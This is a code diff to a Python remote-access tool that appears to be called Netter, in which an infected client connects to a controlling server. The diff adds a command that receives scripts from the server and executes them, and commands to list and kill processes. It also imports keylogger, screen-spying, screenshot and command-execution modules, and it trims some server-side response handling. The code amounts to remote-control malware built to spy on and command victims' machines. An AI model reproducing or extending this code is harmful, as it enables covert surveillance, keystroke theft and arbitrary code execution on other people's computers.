@@ -1,8 +1,6 @@
 import threading, socket, typing
-import time, pickle, os, json, copy
+import pickle, os
 from loguru import logger
-
-import zlib
 
 if typing.TYPE_CHECKING:
     from .device import ClientDevice
@@ -10,10 +8,13 @@ if typing.TYPE_CHECKING:
     from .sock import NetterServer
 
 from .modules import screenshot as modules_screenshot
-from .modules import file_editor
-from .modules import keylogger
-from .modules import command_exec
-from .modules import screen_spy
+from .modules import (
+    file_editor,
+    keylogger,
+    command_exec,
+    screen_spy,
+    execute_script
+)
 
 class ClientWrapper:
     def __init__(self, connection: socket.socket, connectionAddress: tuple[str, int]) -> None:
@@ -68,6 +69,7 @@ class ServerHandler:
 
     def __init__(self, server_address: tuple[str, int], deviceData: bytes, additionalData: dict) -> None:
         self.isConnected, self.isRecording, self.isRunningKeylogger = (False, False, False)
+        self.runningProccess: dict[str, dict] = dict()
         self.server_address: tuple = server_address
 
         self.socketInstance: ClientWrapper = ClientWrapper(
@@ -82,12 +84,11 @@ class ServerHandler:
 
         if (serverResponse == b'0'):
             self.socketInstance.send_packet(b'submit_additional_data ' + pickle.dumps(additionalData))
+            logger.info('Connection established to %s:%s' % self.server_address)
             self.isConnected = True
             return
 
     def start(self) -> None:
-        logger.info('Connection established to %s:%s' % self.server_address)
-
         while self.isConnected:
             message: bytes = self.socketInstance.receive_packet()
 
@@ -109,6 +110,35 @@ class ServerHandler:
 
                 else:
                     self.socketInstance.send_packet('1')
+
+            if (message.startswith(b'execute_script ')):
+                script = message.decode('UTF-8')[15:]
+                fileName = os.path.basename(self.socketInstance.receive_packet().decode('UTF-8'))
+
+                execute_script.run(self, fileName, script)
+
+            if (message.startswith(b'get_process')):
+                if self.runningProccess:
+                    new_data = {}
+
+                    for key, nested_dict in self.runningProccess.items():
+                        data = dict(list(nested_dict.items())[:-1])
+                        new_data[key] = data
+
+                    self.socketInstance.send_packet(pickle.dumps(new_data))
+
+                else:
+                    self.socketInstance.send_packet(b'None')
+
+            if (message.startswith(b'kill_process ')):
+                processID: str = message.decode('UTF-8').split()[1]
+
+                if (processID in list(self.runningProccess.keys())):
+                    self.runningProccess[processID]['process'].kill()
+                    self.socketInstance.send_packet('0')
+
+                else:
+                    self.socketInstance.send_packet('None')
 
             if (message.startswith(b'keylogger_activate')):
                 if not (self.isRunningKeylogger):
@@ -169,35 +199,6 @@ class ClientHandler(threading.Thread):
 
                 if (self.conneciton.runningKeylogger):
                     self.conneciton.socket.receive_packet() # Used to verbose the _keylogger response
-
-            elif (data.startswith(b'exec_response ')):
-
-                if (data[14:15] == b'0'):
-                    logger.success('Command execution successful with exit code: 0')
-
-                elif (data[14:15] == b'1'):
-                    logger.error('Command execution failed with exit code: 1')
-
-                else:
-                    logger.error('Command execution has reached the timeout (8s), execution terminated.')
-                    self.NetterInstance._waitingForResponse = False
-                    continue
-
-                print(data[16:].decode())
-                self.NetterInstance._waitingForResponse = False
-
-            elif (data.startswith(b'screenshot_response ')):
-                if (b'not_available' in data):
-                    logger.error('Client device are not capable of taking screenshots.')
-                    self.NetterInstance._waitingForResponse = False
-                    continue
-
-                fileName: str = f'clients/responses/{self.conneciton.clientUniqueID}/screenshot/{self.conneciton.hostname}-{str(time.time())}.png'
-                screenImg: bytes = zlib.decompress(data[20:])
-
-                self.conneciton.write_file(fileName, screenImg)
-                logger.success(f'Screenshot has been save to {fileName}')
-                self.NetterInstance._waitingForResponse = False
 
             elif (data.startswith(b'keylogger_response ')):
                 self.conneciton.write_file(
